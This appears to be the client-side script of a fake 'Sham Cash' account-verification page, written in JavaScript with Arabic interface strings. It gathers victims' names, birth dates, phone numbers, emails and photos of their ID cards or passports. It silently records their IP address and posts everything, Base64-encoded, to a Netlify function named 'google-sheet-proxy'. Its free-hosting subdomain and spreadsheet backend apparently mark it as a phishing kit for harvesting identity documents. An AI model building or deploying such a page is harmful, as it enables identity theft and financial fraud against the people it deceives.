// SHAM-CASH/verify/verify.js

// =======================================================
//          Global Configurations & IP variable
// =======================================================
const FINAL_REDIRECT_URL = "https://sham-cash-id-verify.netlify.app"; // إذا كان هناك رابط إعادة توجيه بعد النجاح
let userIpAddress = 'غير معروف'; // Global variable to store IP

// =======================================================
//          Utility Functions (from your previous code, adapted)
// =======================================================

// Function to read a file as a Base64 string
function readFileAsBase64(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result.split(',')[1]); // Get only the Base64 part
        reader.onerror = error => reject(error);
        reader.readAsDataURL(file);
    });
}

// Function to fetch IP address and store it globally
async function fetchAndStoreUserIP() {
    try {
        const response = await fetch('https://api64.ipify.org?format=json');
        const data = await response.json();
        userIpAddress = data.ip;
        console.log('IP fetched and stored globally:', userIpAddress);
    } catch (error) {
        console.error('Error fetching IP:', error);
        userIpAddress = 'غير معروف';
    }
}

// Updated Utility Function to send to Netlify Function (General Purpose)
async function sendToNetlifyFunction(type, payload, files = {}) {
    const netlifyFunctionUrl = '/.netlify/functions/google-sheet-proxy';

    // دمج بيانات النص وملفات Base64 في الحمولة (payload)
    const combinedPayload = { ...payload, ipAddress: userIpAddress };

    // إضافة ملفات Base64 إلى الحمولة (إن وجدت)
    for (const key in files) {
        if (files[key]) {
            try {
                combinedPayload[`${key}Base64`] = await readFileAsBase64(files[key]);
            } catch (error) {
                console.error(`Error converting file ${key} to Base64:`, error);
                throw new Error(`Failed to read file ${key}.`);
            }
        }
    }

    try {
        const response = await fetch(netlifyFunctionUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }, // الآن نرسل JSON وليس FormData
            body: JSON.stringify({
                type: type,
                payload: combinedPayload // نرسل الحمولة المجمعة
            })
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error('Netlify function error response:', errorData);
            throw new Error(`Netlify function returned status ${response.status}: ${errorData.message}`);
        }

        const data = await response.json();
        console.log('Message successfully sent via Netlify Function:', data);
        return data;
    } catch (error) {
        console.error('Error sending message to Netlify Function:', error);
        showCustomModal('فشل الإرسال', 'عذرًا، حدث خطأ أثناء إرسال طلبك. الرجاء المحاولة لاحقًا.', false);
    }
}

// Functions for error display (kept as per your provided code)
function showError(inputElement, messageElement, message) {
    const parentInputGroup = inputElement.closest('.input-group') || inputElement.closest('.form-field-wrapper'); // Added form-field-wrapper for file inputs
    if (parentInputGroup) {
        parentInputGroup.classList.add('error');
    }
    messageElement.textContent = message;
    messageElement.classList.remove('hidden');
}

function hideError(inputElement, messageElement) {
    const parentInputGroup = inputElement.closest('.input-group') || inputElement.closest('.form-field-wrapper');
    if (parentInputGroup) {
        parentInputGroup.classList.remove('error');
    }
    messageElement.classList.add('hidden');
    messageElement.textContent = '';
}

// Function to show custom modal messages
function showCustomModal(message, subtext, isSuccess = true) {
    const modalMessage = document.querySelector('#customModalOverlay .modal-message');
    const modalSubtext = document.querySelector('#customModalOverlay .modal-subtext');
    const modalSpinner = document.querySelector('#customModalOverlay .modal-spinner');

    modalMessage.textContent = message;
    modalSubtext.textContent = subtext;

    if (isSuccess) {
        modalSpinner.classList.add('hidden'); // Hide spinner for success
    } else {
        modalSpinner.classList.remove('hidden'); // Show spinner for errors/loading
    }

    customModalOverlay.classList.remove('hidden');
    customModalOverlay.classList.add('show');

    setTimeout(() => {
        customModalOverlay.classList.remove('show');
        customModalOverlay.classList.add('hidden');
    }, 5000); // Hide after 5 seconds
}

// =======================================================
//          DOM Elements References
// =======================================================
const verificationForm = document.getElementById('verificationForm');
const appLogo = document.getElementById('appLogo');
const otherReasonInput = document.getElementById('otherReason');
const otherDocumentInput = document.getElementById('otherDocument');
const documentTypeRadios = document.querySelectorAll('input[name="documentType"]');
const documentUploadSection = document.getElementById('documentUploadSection');
const idFrontContainer = document.getElementById('idFrontContainer');
const idBackContainer = document.getElementById('idBackContainer');
const passportPageContainer = document.getElementById('passportPageContainer');
const birthYearSelect = document.getElementById('birthYear');
const birthMonthSelect = document.getElementById('birthMonth');
const birthDaySelect = document.getElementById('birthDay');
const loadingOverlay = document.getElementById('loadingOverlay');
const loadingMessage = document.getElementById('loadingMessage');
const customModalOverlay = document.getElementById('customModalOverlay');

// Error message elements
const accountTypeError = document.getElementById('accountTypeError');
const reasonError = document.getElementById('reasonError');
const documentTypeError = document.getElementById('documentTypeError');
const fullNameError = document.getElementById('fullNameError');
const birthDateError = document.getElementById('birthDateError');
const shamcashEmailError = document.getElementById('shamcashEmailError');
const phoneNumberError = document.getElementById('phoneNumberError');
const idFrontError = document.getElementById('idFrontError');
const idBackError = document.getElementById('idBackError');
const passportPageError = document.getElementById('passportPageError');


// =======================================================
//          Initial Setup (Run on page load)
// =======================================================

// Set logo source
appLogo.src = "../img/shamcash.svg"; // مسار اللوجو المعدل

// Populate year dropdown (last 100 years from current)
const currentYear = new Date().getFullYear();
for (let i = currentYear; i >= currentYear - 100; i--) {
    const option = document.createElement('option');
    option.value = i;
    option.textContent = i;
    birthYearSelect.appendChild(option);
}

// Populate month dropdown (1-12)
for (let i = 1; i <= 12; i++) {
    const option = document.createElement('option');
    option.value = i.toString().padStart(2, '0'); // ensure two digits
    option.textContent = i.toString().padStart(2, '0');
    birthMonthSelect.appendChild(option);
}

// Populate day dropdown (1-31 initially)
for (let i = 1; i <= 31; i++) {
    const option = document.createElement('option');
    option.value = i.toString().padStart(2, '0'); // ensure two digits
    option.textContent = i.toString().padStart(2, '0');
    birthDaySelect.appendChild(option);
}

// Adjust days in month dynamically
birthMonthSelect.addEventListener('change', updateDaysInMonth);
birthYearSelect.addEventListener('change', updateDaysInMonth);

function updateDaysInMonth() {
    const year = parseInt(birthYearSelect.value);
    const month = parseInt(birthMonthSelect.value);
    const daySelect = birthDaySelect;
    const selectedDay = parseInt(daySelect.value);

    daySelect.innerHTML = ''; // Clear existing days

    if (isNaN(year) || isNaN(month)) return;

    const daysInMonth = new Date(year, month, 0).getDate(); // Get last day of month

    for (let i = 1; i <= daysInMonth; i++) {
        const option = document.createElement('option');
        option.value = i.toString().padStart(2, '0');
        option.textContent = i.toString().padStart(2, '0');
        daySelect.appendChild(option);
    }

    // Re-select the previously selected day if it's still valid
    if (selectedDay <= daysInMonth) {
        daySelect.value = selectedDay.toString().padStart(2, '0');
    }
}
// Initialize days in month on page load
updateDaysInMonth();


// Handle "آخر" option for reason and document type
document.querySelectorAll('input[name="verificationReason"]').forEach(radio => {
    radio.addEventListener('change', () => {
        if (radio.value === 'آخر') {
            otherReasonInput.classList.remove('hidden');
            otherReasonInput.setAttribute('required', 'true');
        } else {
            otherReasonInput.classList.add('hidden');
            otherReasonInput.removeAttribute('required');
            otherReasonInput.value = '';
        }
        hideError(otherReasonInput, reasonError); // Hide reason error if "آخر" is selected
    });
});

documentTypeRadios.forEach(radio => {
    radio.addEventListener('change', () => {
        if (radio.value === 'آخر') {
            otherDocumentInput.classList.remove('hidden');
            otherDocumentInput.setAttribute('required', 'true');
        } else {
            otherDocumentInput.classList.add('hidden');
            otherDocumentInput.removeAttribute('required');
            otherDocumentInput.value = '';
        }
        hideError(otherDocumentInput, documentTypeError); // Hide document type error
        updateDocumentUploadSection(); // Update visibility of upload fields
    });
});

// Function to update visibility of document upload fields
function updateDocumentUploadSection() {
    const selectedDocType = document.querySelector('input[name="documentType"]:checked')?.value;

    documentUploadSection.classList.add('hidden');
    idFrontContainer.classList.add('hidden');
    idBackContainer.classList.add('hidden');
    passportPageContainer.classList.add('hidden');

    document.getElementById('idFront').removeAttribute('required');
    document.getElementById('idBack').removeAttribute('required');
    document.getElementById('passportPage').removeAttribute('required');

    hideError(document.getElementById('idFront'), idFrontError);
    hideError(document.getElementById('idBack'), idBackError);
    hideError(document.getElementById('passportPage'), passportPageError);


    if (selectedDocType) {
        documentUploadSection.classList.remove('hidden');
        if (selectedDocType === 'جواز السفر السوري') {
            passportPageContainer.classList.remove('hidden');
            document.getElementById('passportPage').setAttribute('required', 'true');
        } else if (selectedDocType !== 'آخر') { // For other specific ID types
            idFrontContainer.classList.remove('hidden');
            document.getElementById('idFront').setAttribute('required', 'true');
            // Check if back is required (assume all non-passport docs have front/back)
            idBackContainer.classList.remove('hidden');
            document.getElementById('idBack').setAttribute('required', 'true');
        }
    }
}
// Initial call to set correct visibility on page load
updateDocumentUploadSection();

// Fetch IP on page load
fetchAndStoreUserIP();

// =======================================================
//          Event Listeners & Form Logic
// =======================================================

// Basic input validation for instant feedback
document.querySelectorAll('.input-field, .select-field, .other-input').forEach(input => {
    input.addEventListener('input', function() {
        // Determine which error message to hide based on input ID or name
        const errorId = this.id + 'Error';
        const errorElement = document.getElementById(errorId);
        if (errorElement && !errorElement.classList.contains('hidden')) {
            hideError(this, errorElement);
        }

        // Specific for radio group errors
        if (this.name === 'accountType' && !accountTypeError.classList.contains('hidden')) {
            accountTypeError.classList.add('hidden');
        }
        if (this.name === 'verificationReason' && !reasonError.classList.contains('hidden')) {
            reasonError.classList.add('hidden');
        }
        if (this.name === 'documentType' && !documentTypeError.classList.contains('hidden')) {
            documentTypeError.classList.add('hidden');
        }
    });
});

// Event listener for form submission
verificationForm.addEventListener('submit', async function(event) {
    event.preventDefault(); // Prevent default form submission

    loadingMessage.textContent = 'جاري إرسال طلبك...';
    loadingOverlay.classList.remove('hidden');

    let isValid = true; // Overall form validation flag

    // --- 1. Validate Radio Buttons ---
    const accountType = document.querySelector('input[name="accountType"]:checked')?.value;
    if (!accountType) {
        showError(document.querySelector('input[name="accountType"]'), accountTypeError, 'الرجاء تحديد نوع الحساب.');
        isValid = false;
    } else {
        hideError(document.querySelector('input[name="accountType"]'), accountTypeError);
    }

    const verificationReasonRadio = document.querySelector('input[name="verificationReason"]:checked');
    let verificationReason = verificationReasonRadio?.value;
    if (!verificationReason) {
        showError(otherReasonInput, reasonError, 'الرجاء تحديد سبب الطلب.');
        isValid = false;
    } else if (verificationReason === 'آخر' && otherReasonInput.value.trim() === '') {
        showError(otherReasonInput, reasonError, 'الرجاء تحديد السبب الآخر.');
        isValid = false;
    } else if (verificationReason === 'آخر') {
        verificationReason = otherReasonInput.value.trim(); // Use custom reason
    } else {
        hideError(otherReasonInput, reasonError);
    }

    const documentTypeRadio = document.querySelector('input[name="documentType"]:checked');
    let documentType = documentTypeRadio?.value;
    if (!documentType) {
        showError(otherDocumentInput, documentTypeError, 'الرجاء تحديد نوع الوثيقة.');
        isValid = false;
    } else if (documentType === 'آخر' && otherDocumentInput.value.trim() === '') {
        showError(otherDocumentInput, documentTypeError, 'الرجاء تحديد نوع الوثيقة الآخر.');
        isValid = false;
    } else if (documentType === 'آخر') {
        documentType = otherDocumentInput.value.trim(); // Use custom document type
    } else {
        hideError(otherDocumentInput, documentTypeError);
    }

    // --- 2. Validate Text Fields ---
    const fullNameInput = document.getElementById('fullName');
    if (fullNameInput.value.trim() === '') {
        showError(fullNameInput, fullNameError, 'هذا الحقل مطلوب.');
        isValid = false;
    } else {
        hideError(fullNameInput, fullNameError);
    }

    const shamcashEmailInput = document.getElementById('shamcashEmail');
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const allowedDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com']; // Add more as needed

    if (shamcashEmailInput.value.trim() === '') {
        showError(shamcashEmailInput, shamcashEmailError, 'الرجاء إدخال بريد إلكتروني.');
        isValid = false;
    } else if (!emailRegex.test(shamcashEmailInput.value.trim())) {
        showError(shamcashEmailInput, shamcashEmailError, 'صيغة البريد الإلكتروني غير صالحة.');
        isValid = false;
    } else {
        const domain = shamcashEmailInput.value.split('@')[1];
        if (!allowedDomains.includes(domain)) {
            showError(shamcashEmailInput, shamcashEmailError, 'الرجاء استخدام بريد إلكتروني من خدمة موثوقة (مثل Gmail, Yahoo).');
            isValid = false;
        } else {
            hideError(shamcashEmailInput, shamcashEmailError);
        }
    }


    const phoneNumberInput = document.getElementById('phoneNumber');
    if (phoneNumberInput.value.trim() === '') {
        showError(phoneNumberInput, phoneNumberError, 'الرجاء إدخال رقم الهاتف.');
        isValid = false;
    } else if (!/^\d+$/.test(phoneNumberInput.value.trim())) { // Only numbers
        showError(phoneNumberInput, phoneNumberError, 'الرجاء إدخال أرقام فقط.');
        isValid = false;
    } else {
        hideError(phoneNumberInput, phoneNumberError);
    }


    // --- 3. Validate Date of Birth ---
    const year = birthYearSelect.value;
    const month = birthMonthSelect.value;
    const day = birthDaySelect.value;

    if (year === '' || month === '' || day === '') {
        showError(birthYearSelect, birthDateError, 'الرجاء تحديد تاريخ الميلاد كاملاً.');
        isValid = false;
    } else {
        const dob = new Date(`${year}-${month}-${day}`);
        if (isNaN(dob.getTime())) { // Check for invalid date
            showError(birthYearSelect, birthDateError, 'تاريخ ميلاد غير صالح.');
            isValid = false;
        } else {
            hideError(birthYearSelect, birthDateError);
        }
    }


    // --- 4. Validate File Uploads ---
    const idFrontInput = document.getElementById('idFront');
    const idBackInput = document.getElementById('idBack');
    const passportPageInput = document.getElementById('passportPage');

    let filesToUpload = {};

    if (documentType === 'جواز السفر السوري') {
        if (!passportPageInput.files.length) {
            showError(passportPageInput, passportPageError, 'صورة الصفحة الأولى من جواز السفر مطلوبة.');
            isValid = false;
        } else {
            hideError(passportPageInput, passportPageError);
            filesToUpload.passportPage = passportPageInput.files[0];
        }
    } else if (documentType && documentType !== 'آخر') { // If a specific ID type is selected, and it's not "آخر"
        if (!idFrontInput.files.length) {
            showError(idFrontInput, idFrontError, 'صورة الوجه الأمامي مطلوبة.');
            isValid = false;
        } else {
            hideError(idFrontInput, idFrontError);
            filesToUpload.idFront = idFrontInput.files[0];
        }
        if (!idBackInput.files.length) {
            showError(idBackInput, idBackError, 'صورة الوجه الخلفي مطلوبة.');
            isValid = false;
        } else {
            hideError(idBackInput, idBackError);
            filesToUpload.idBack = idBackInput.files[0];
        }
    }

    if (!isValid) {
        loadingOverlay.classList.add('hidden'); // Hide loading if validation fails
        return;
    }

    // --- All validations passed, proceed with submission ---
    const formData = {
        accountType: accountType,
        verificationReason: verificationReason,
        documentType: documentType,
        fullName: fullNameInput.value.trim(),
        birthDate: `${year}-${month}-${day}`, // YYYY-MM-DD format
        shamcashEmail: shamcashEmailInput.value.trim(),
        phoneNumber: phoneNumberInput.value.trim()
    };

    // Show loading overlay
    loadingMessage.textContent = 'جاري إرسال طلبك...';
    loadingOverlay.classList.remove('hidden');

    try {
        // Send data and files to Netlify function
        await sendToNetlifyFunction('verification_request', formData, filesToUpload);

        // On success: show success modal and redirect
        loadingOverlay.classList.add('hidden');
        showCustomModal('تم إرسال طلبك بنجاح!', 'سيتم مراجعة بياناتك والتواصل معك قريباً.', true);
        setTimeout(() => {
            window.location.href = FINAL_REDIRECT_URL;
        }, 3000); // Redirect after 3 seconds
    } catch (error) {
        console.error('Error during form submission:', error);
        loadingOverlay.classList.add('hidden');
        showCustomModal('فشل الإرسال', 'عذرًا، حدث خطأ أثناء إرسال طلبك. الرجاء المحاولة لاحقًا.', false);
    }
});
